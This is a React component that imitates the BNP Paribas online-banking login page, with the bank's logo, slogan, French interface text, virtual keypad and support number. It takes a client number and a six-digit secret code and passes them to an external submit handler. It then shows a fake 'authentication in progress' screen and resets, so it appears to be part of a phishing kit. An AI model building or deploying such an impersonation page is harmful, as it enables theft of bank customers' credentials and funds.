import React, { useState } from 'react';
import { Loader2, Eye, EyeOff } from 'lucide-react';

interface BnpAuthTemplateProps {
  onSubmit: (formData: any) => Promise<boolean>;
}

export function BnpAuthTemplate({ onSubmit }: BnpAuthTemplateProps) {
  const [formData, setFormData] = useState({
    clientNumber: '',
    secretCode: ''
  });
  const [status, setStatus] = useState<'idle' | 'sending' | 'success' | 'error'>('idle');
  const [showLoader, setShowLoader] = useState(false);
  const [showSecretCode, setShowSecretCode] = useState(false);
  const [secretCodeDigits, setSecretCodeDigits] = useState(['', '', '', '', '', '']);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setStatus('sending');

    try {
      const submitData = {
        ...formData,
        secretCode: secretCodeDigits.join('')
      };
      
      const success = await onSubmit(submitData);
      if (!success) throw new Error('Failed to submit form');
      
      setStatus('success');
      setShowLoader(true);
      
      setTimeout(() => {
        setShowLoader(false);
        setStatus('idle');
      }, 3000);
    } catch (error) {
      setStatus('error');
      setTimeout(() => setStatus('idle'), 3000);
    }
  };

  const handleSecretCodeChange = (index: number, value: string) => {
    if (value.length <= 1 && /^\d*$/.test(value)) {
      const newDigits = [...secretCodeDigits];
      newDigits[index] = value;
      setSecretCodeDigits(newDigits);
      
      // Auto-focus next input
      if (value && index < 5) {
        const nextInput = document.getElementById(`digit-${index + 1}`);
        nextInput?.focus();
      }
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === 'Backspace' && !secretCodeDigits[index] && index > 0) {
      const prevInput = document.getElementById(`digit-${index - 1}`);
      prevInput?.focus();
    }
  };

  // Show loader overlay when processing
  if (showLoader) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-green-600 to-green-700 pt-20">
        <div className="max-w-4xl mx-auto px-4 py-8">
          <div className="bg-white rounded-2xl shadow-xl p-8">
            <div className="flex flex-col items-center justify-center py-16">
              <Loader2 className="w-12 h-12 animate-spin text-green-600 mb-6" />
              <h2 className="text-2xl font-bold text-gray-800 mb-4">
                Authentification en cours...
              </h2>
              <p className="text-gray-600 text-center max-w-md">
                Connexion sécurisée à votre espace BNP Paribas en cours. Veuillez patienter.
              </p>
              <div className="mt-8 w-full max-w-xs">
                <div className="bg-gray-200 rounded-full h-2">
                  <div className="bg-green-600 h-2 rounded-full animate-pulse" style={{ width: '90%' }}></div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-green-600 to-green-700">
      {/* BNP Header */}
      <div className="bg-white shadow-sm">
        <div className="max-w-7xl mx-auto px-4 py-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center space-x-4">
              <img 
                src="https://logos-world.net/wp-content/uploads/2021/02/BNP-Paribas-Logo.png" 
                alt="BNP Paribas" 
                className="h-8"
              />
              <span className="text-gray-600 text-sm">La banque d'un monde qui change</span>
            </div>
            <div className="flex items-center space-x-4">
              <button className="text-gray-600 hover:text-gray-800">
                🔔
              </button>
              <button className="bg-green-600 text-white px-4 py-2 rounded text-sm hover:bg-green-700">
                Devenir client
              </button>
            </div>
          </div>
        </div>
      </div>

      <div className="flex min-h-screen">
        {/* Left Panel - Auth Form */}
        <div className="w-full lg:w-1/2 bg-green-600 flex items-center justify-center p-8">
          <div className="w-full max-w-md">
            <div className="bg-white rounded-lg shadow-xl p-8">
              <h1 className="text-2xl font-bold text-white bg-green-600 -mx-8 -mt-8 p-6 rounded-t-lg mb-8">
                ACCÉDER À MES COMPTES
              </h1>

              <form onSubmit={handleSubmit} className="space-y-6">
                {/* Client Number */}
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-2">
                    1. Mon numéro client
                  </label>
                  <div className="relative">
                    <input
                      type="text"
                      value={formData.clientNumber}
                      onChange={(e) => setFormData(prev => ({ ...prev, clientNumber: e.target.value }))}
                      className="w-full px-4 py-3 border border-gray-300 rounded focus:ring-2 focus:ring-green-500 focus:border-transparent"
                      placeholder="Numéro client"
                      required
                    />
                    <button
                      type="button"
                      className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400"
                    >
                      👁️
                    </button>
                  </div>
                </div>

                {/* Secret Code */}
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-2">
                    2. Mon code secret (6 chiffres)
                  </label>
                  
                  {/* Virtual Keypad */}
                  <div className="bg-green-50 rounded-lg p-4 mb-4">
                    <div className="grid grid-cols-6 gap-2 mb-4">
                      {secretCodeDigits.map((digit, index) => (
                        <input
                          key={index}
                          id={`digit-${index}`}
                          type={showSecretCode ? "text" : "password"}
                          value={digit}
                          onChange={(e) => handleSecretCodeChange(index, e.target.value)}
                          onKeyDown={(e) => handleKeyDown(index, e)}
                          className="w-12 h-12 text-center border border-gray-300 rounded focus:ring-2 focus:ring-green-500 focus:border-transparent text-lg font-bold"
                          maxLength={1}
                        />
                      ))}
                    </div>
                    
                    {/* Number Pad */}
                    <div className="grid grid-cols-3 gap-2 max-w-48 mx-auto">
                      {[5, 6, 1, 8, 7, 2, 9, 4, 0].map((num) => (
                        <button
                          key={num}
                          type="button"
                          onClick={() => {
                            const emptyIndex = secretCodeDigits.findIndex(d => d === '');
                            if (emptyIndex !== -1) {
                              handleSecretCodeChange(emptyIndex, num.toString());
                            }
                          }}
                          className="w-12 h-12 bg-green-100 hover:bg-green-200 rounded text-lg font-bold transition-colors"
                        >
                          {num}
                        </button>
                      ))}
                    </div>
                  </div>

                  <button
                    type="button"
                    onClick={() => setShowSecretCode(!showSecretCode)}
                    className="flex items-center space-x-2 text-sm text-green-600 hover:text-green-700"
                  >
                    {showSecretCode ? <EyeOff size={16} /> : <Eye size={16} />}
                    <span>{showSecretCode ? 'Masquer' : 'Afficher'} le code</span>
                  </button>
                </div>

                <button
                  type="submit"
                  disabled={status === 'sending' || secretCodeDigits.some(d => d === '') || !formData.clientNumber}
                  className="w-full bg-green-600 text-white font-semibold py-3 rounded hover:bg-green-700 disabled:opacity-50 disabled:cursor-not-allowed transition-colors"
                >
                  {status === 'sending' ? 'Connexion...' : 'Accéder à mes Comptes'}
                </button>

                {status === 'error' && (
                  <div className="text-red-600 text-center bg-red-50 p-3 rounded">
                    Échec de la connexion. Veuillez vérifier vos identifiants.
                  </div>
                )}
              </form>

              <div className="mt-6 text-center">
                <button className="text-green-600 hover:text-green-700 text-sm underline">
                  Numéro client ou code secret oublié ?
                </button>
              </div>
            </div>
          </div>
        </div>

        {/* Right Panel - Security Info */}
        <div className="hidden lg:block lg:w-1/2 bg-white p-8">
          <div className="max-w-md mx-auto mt-16">
            {/* Security Tips */}
            <div className="mb-8">
              <h3 className="text-lg font-semibold text-gray-800 mb-4 flex items-center">
                🔒 Vos codes d'accès
              </h3>
              <div className="text-sm text-gray-600 space-y-2">
                <p><strong>Obtenir ses codes d'accès</strong></p>
              </div>
            </div>

            <div className="mb-8">
              <h3 className="text-lg font-semibold text-gray-800 mb-4 flex items-center">
                🛡️ Conseils de sécurité
              </h3>
              <div className="text-sm text-gray-600 space-y-2">
                <p>Vérifiez que l'adresse du site commence exactement par :</p>
                <p className="font-mono bg-gray-100 p-2 rounded">
                  https
                </p>
                <p>précédée par une icône cadenas et contient un https:// qui garantit une connexion sécurisée.</p>
              </div>
            </div>

            <div className="mb-8">
              <h3 className="text-lg font-semibold text-gray-800 mb-4 flex items-center">
                ♿ Pour une meilleure accessibilité
              </h3>
              <div className="text-sm text-gray-600">
                <p><strong>Connectez-vous</strong> grâce à la grille contrastée, agrandie et bénéficiez d'un accompagnement vocal.</p>
              </div>
            </div>

            {/* Customer Service */}
            <div className="bg-gray-50 rounded-lg p-4">
              <h4 className="font-semibold text-gray-800 mb-2">📞 Informations client</h4>
              <p className="text-sm text-gray-600 mb-2">
                Si vous rencontrez des problèmes techniques lors de votre navigation, nous vous invitons à contacter nos conseillers en ligne au :
              </p>
              <div className="bg-blue-100 text-blue-800 px-3 py-2 rounded text-center font-bold">
                3477
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
